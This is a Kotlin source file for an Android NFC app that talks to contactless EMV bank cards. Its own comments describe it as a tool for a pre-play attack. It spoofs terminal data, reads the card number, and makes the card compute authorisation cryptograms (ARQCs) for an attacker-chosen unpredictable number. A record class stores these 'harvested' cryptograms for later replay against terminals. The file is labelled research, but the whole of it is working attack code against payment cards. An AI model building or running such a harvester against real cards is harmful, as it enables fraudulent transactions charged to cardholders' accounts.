package xyz.nfc.moksha

import android.nfc.tech.IsoDep
import xyz.nfc.moksha.TlvParser.fromHex
import xyz.nfc.moksha.TlvParser.toHex

/**
 * Handles a single EMV session with a physical card.
 *
 * Key research capability: [generateAc] accepts a caller-supplied UN (tag 9F37).
 * The card uses whatever UN we give it — it cannot verify the UN came from a
 * legitimate terminal. This is the core weakness that enables pre-play attacks.
 *
 * The card will compute:
 *   ARQC = 3DES-MAC(ICC_key, ATC || UN || amount || other_terminal_data)
 *
 * If an attacker predicts what UN a terminal will later use and pre-harvests
 * an ARQC with that exact UN, the bank's validation will succeed.
 */
class EmvSession(private val card: IsoDep) {

    data class GenerateAcResult(
        val arqc: ByteArray,      // 8-byte Application Request Cryptogram
        val atc: ByteArray,       // 2-byte Application Transaction Counter
        val cid: Byte,            // Cryptogram Information Data
        val iad: ByteArray,       // Issuer Application Data
        val unUsed: ByteArray,    // The UN we fed to the card
        val pan: String,          // Masked PAN from card records
        val aid: ByteArray,       // AID selected
        val cdol1: ByteArray      // Raw CDOL1 from card (for research)
    )

    // EMV tag constants
    companion object {
        const val TAG_AID        = 0x4F
        const val TAG_AFL        = 0x94   // Application File Locator
        const val TAG_CDOL1      = 0x8C
        const val TAG_PAN        = 0x5A
        const val TAG_ATC        = 0x9F36
        const val TAG_ARQC       = 0x9F26
        const val TAG_CID        = 0x9F27
        const val TAG_IAD        = 0x9F10
        const val TAG_UN         = 0x9F37
        const val TAG_PDOL       = 0x9F38  // Processing Data Object List in FCI

        val VISA_AID   = "A0000000031010".fromHex()
        val MC_AID     = "A0000000041010".fromHex()
    }

    private var selectedAid  = ByteArray(0)
    private var cdol1        = ByteArray(0)
    private var cdol1Fields  = listOf<Pair<Int, Int>>()
    private var pan          = "UNKNOWN"
    private var pdolFields   = listOf<Pair<Int, Int>>()  // (tag, len) from card's PDOL

    /** Step 1 — SELECT the EMV application by AID. */
    fun selectApp(aid: ByteArray = VISA_AID): ByteArray {
        val cmd = byteArrayOf(0x00, 0xA4.toByte(), 0x04, 0x00,
            aid.size.toByte()) + aid + byteArrayOf(0x00)
        val resp = card.transceive(cmd)
        checkSw(resp, "SELECT")
        selectedAid = aid

        // Parse PDOL (9F38) from FCI so GPO sends valid terminal data
        val nodes    = TlvParser.parse(resp, 0, resp.size - 2)
        val pdolNode = TlvParser.find(nodes, TAG_PDOL)
        pdolFields   = if (pdolNode != null) TlvParser.parseDol(pdolNode.value) else emptyList()
        android.util.Log.d("EmvSession", "SELECT pdolFields=$pdolFields")

        return resp
    }

    /** Step 2 — GET PROCESSING OPTIONS (initiates transaction, card increments ATC). */
    fun getProcessingOptions(): ByteArray {
        // Build PDOL response with sensible terminal defaults.
        // Sending valid non-zero values prevents SW=6985 from Visa cards that validate TTQ.
        val pdolData = buildPdolResponse()
        val template = byteArrayOf(0x83.toByte(), pdolData.size.toByte()) + pdolData
        val cmd = byteArrayOf(0x80.toByte(), 0xA8.toByte(), 0x00, 0x00,
            template.size.toByte()) + template + byteArrayOf(0x00)
        val resp = card.transceive(cmd)
        checkSw(resp, "GET PROCESSING OPTIONS")
        return resp
    }

    /**
     * Build PDOL response data from the field list parsed out of SELECT FCI.
     * Each field gets a sensible terminal default so GPO returns 9000 instead of 6985.
     */
    private fun buildPdolResponse(): ByteArray {
        if (pdolFields.isEmpty()) return ByteArray(0)
        val buf = mutableListOf<Byte>()
        for ((tag, len) in pdolFields) {
            val value: ByteArray = when (tag) {
                0x9F66 -> byteArrayOf(0x36, 0x00, 0x40, 0x00)  // TTQ: EMV+online, no CVM
                0x9F02 -> byteArrayOf(0,0,0,0,0x10,0x00)        // Amount: ₹10.00
                0x9F03 -> ByteArray(6)                           // Amount Other: 0
                0x9F1A -> byteArrayOf(0x03, 0x56)               // Country: India (356)
                0x95   -> ByteArray(5)                           // TVR: zeros
                0x5F2A -> byteArrayOf(0x03, 0x56)               // Currency: INR (356)
                0x9A   -> byteArrayOf(0x26, 0x06, 0x05)         // Date: 2026-06-05
                0x9C   -> byteArrayOf(0x00)                      // Tx Type: purchase
                0x9F37 -> byteArrayOf(0,0,0,1)                  // UN placeholder
                0x9F35 -> byteArrayOf(0x22)                      // Terminal Type: attended POS, online
                0x9F45 -> ByteArray(2)                           // DAC: zeros
                0x9F4C -> ByteArray(8)                           // ICC Dynamic Number: zeros
                0x9F34 -> byteArrayOf(0x42, 0x03, 0x00)         // CVM Results: PIN online
                0x9F21 -> byteArrayOf(0x22, 0x15, 0x00)         // Time: 22:15:00
                else   -> ByteArray(len)
            }
            val field = ByteArray(len)
            value.copyInto(field, 0, 0, minOf(value.size, len))
            field.forEach { buf.add(it) }
        }
        return buf.toByteArray()
    }

    /**
     * Step 3 — READ RECORDS using AFL from GPO response.
     * Extracts CDOL1 (which tells us where UN sits in GENERATE AC data)
     * and PAN.
     */
    fun readRecords(gpoResp: ByteArray) {
        val nodes = TlvParser.parse(gpoResp, 0, gpoResp.size - 2)
        val afl = TlvParser.find(nodes, TAG_AFL)?.value ?: return

        // AFL is groups of 4 bytes: SFI, first record, last record, offline count
        var i = 0
        while (i + 3 < afl.size) {
            val sfi   = (afl[i].toInt() and 0xF8) ushr 3
            val first = afl[i + 1].toInt() and 0xFF
            val last  = afl[i + 2].toInt() and 0xFF
            i += 4

            for (rec in first..last) {
                val p2 = ((sfi shl 3) or 0x04).toByte()
                val cmd = byteArrayOf(0x00, 0xB2.toByte(), rec.toByte(), p2, 0x00)
                val resp = card.transceive(cmd)
                if (!isSw9000(resp)) continue

                val recNodes = TlvParser.parse(resp, 0, resp.size - 2)

                // Extract CDOL1
                val c1 = TlvParser.find(recNodes, TAG_CDOL1)
                if (c1 != null) {
                    cdol1 = c1.value
                    cdol1Fields = TlvParser.parseDol(cdol1)
                }

                // Extract PAN (tag 5A)
                val panNode = TlvParser.find(recNodes, TAG_PAN)
                if (panNode != null) {
                    pan = panNode.valueHex().trimEnd('F').trimEnd('f')
                }
            }
        }
    }

    /**
     * Step 4 — GENERATE AC with a CALLER-CHOSEN UN.
     *
     * This is the research-critical step. We build the CDOL1 data buffer
     * and inject [targetUn] at the position of tag 9F37.
     * The card will compute an ARQC cryptogram over this data including
     * our chosen UN. The card does not verify the UN came from a legitimate terminal.
     *
     * Pre-play proof: if an attacker pre-captures this ARQC using UN=X,
     * and a real terminal later generates UN=X, the bank will accept the replay.
     */
    fun generateAc(targetUn: ByteArray): GenerateAcResult {
        require(targetUn.size == 4) { "UN must be 4 bytes" }

        // Build CDOL1 data buffer. Fill all fields with zeros, then inject UN.
        val totalLen = cdol1Fields.sumOf { it.second }
        val cdolData = ByteArray(totalLen)  // zeros everywhere

        // Inject our chosen UN at the correct offset in the CDOL1 buffer
        val unPos = TlvParser.dolFieldOffset(cdol1Fields, TAG_UN)
        if (unPos != null) {
            targetUn.copyInto(cdolData, unPos.first)
        }
        // If CDOL1 not parsed, fall back to a known Visa CDOL1 layout:
        //   Amount(6) + AmountOther(6) + Country(2) + TVR(5) + Currency(2)
        //   + Date(3) + TxType(1) + UN(4) + TermType(1) + DAC(2) + CVM(3) + Time(3) = 38
        // UN is at offset 25.
        else if (totalLen == 0) {
            val fallback = ByteArray(38)
            targetUn.copyInto(fallback, 25)
            return generateAcRaw(fallback, targetUn)
        }

        return generateAcRaw(cdolData, targetUn)
    }

    private fun generateAcRaw(cdolData: ByteArray, unUsed: ByteArray): GenerateAcResult {
        // 80 AE 80 00 [Lc] [CDOL1 data] 00
        // 0x80 = request ARQC (online authorisation cryptogram)
        val cmd = byteArrayOf(0x80.toByte(), 0xAE.toByte(), 0x80.toByte(), 0x00,
            cdolData.size.toByte()) + cdolData + byteArrayOf(0x00)
        val resp = card.transceive(cmd)
        checkSw(resp, "GENERATE AC")

        val respNodes = TlvParser.parse(resp, 0, resp.size - 2)
        val arqc = TlvParser.find(respNodes, TAG_ARQC)?.value ?: ByteArray(8)
        val atc  = TlvParser.find(respNodes, TAG_ATC )?.value ?: ByteArray(2)
        val cid  = TlvParser.find(respNodes, TAG_CID )?.value?.firstOrNull() ?: 0x80.toByte()
        val iad  = TlvParser.find(respNodes, TAG_IAD )?.value ?: ByteArray(0)

        return GenerateAcResult(
            arqc    = arqc,
            atc     = atc,
            cid     = cid,
            iad     = iad,
            unUsed  = unUsed,
            pan     = pan,
            aid     = selectedAid,
            cdol1   = cdol1
        )
    }

    private fun isSw9000(resp: ByteArray) =
        resp.size >= 2 &&
        resp[resp.size - 2] == 0x90.toByte() &&
        resp[resp.size - 1] == 0x00.toByte()

    private fun checkSw(resp: ByteArray, cmd: String) {
        if (!isSw9000(resp)) {
            val sw = if (resp.size >= 2)
                "%02X%02X".format(resp[resp.size-2], resp[resp.size-1])
            else "??"
            throw Exception("$cmd failed: SW=$sw")
        }
    }
}

/** One ARQC harvest record stored in the research database. */
data class HarvestRecord(
    val id: Long = 0,
    val pan: String,
    val aid: String,
    val atcHex: String,      // ATC used (hex)
    val atcDec: Int,         // ATC decimal
    val unHex: String,       // UN we injected (hex) — the "predicted" value
    val arqcHex: String,     // ARQC the card computed for our UN
    val timestamp: Long,     // epoch ms
    val note: String = ""    // e.g. "predicted from sequential pattern"
)
